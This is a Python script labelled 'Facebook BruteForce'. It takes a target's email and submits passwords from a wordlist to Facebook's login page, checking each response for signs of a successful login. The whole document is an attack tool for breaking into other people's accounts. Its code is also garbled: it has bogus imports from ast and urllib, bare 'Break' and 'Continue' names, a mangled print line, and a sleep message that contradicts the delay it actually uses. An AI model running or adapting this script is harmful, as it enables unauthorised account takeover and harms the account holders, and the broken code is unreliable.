import sys
from ast import Break, Continue
from urllib import open, request, select
import time
if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 2.x
	use: python fb2.py
--------------------------------------
			''')
	Break

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import urllib
	import mechanize
	urllib = mechanize.Browser()
	urllib.addheaders = [('User-Agent',headers['User-Agent'])]
	urllib.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')

print('\n---------- Welcome To Facebook BruteForce ----------\n')
file=open('passwords.txt','r')

email = input("input Email of target:")
print ("\nTarget Email ID : ",email+"")
print ("\nTrying Passwords from list ")
i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 6:
		Continue
	print ;str (i) +" : ",passw
	response = urllib.open(post_url)
	try:
		if response.code == 200:
			urllib.select_form(nr=0)
			urllib.form['email'] = email
			urllib.form['pass'] = passw
			response = urllib.submit()
			response_data = response.read()
			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
				print('Your password is : ',passw)
				break
	except:
		print('\nSleeping for time : 2 min\n')
		time.sleep(300)
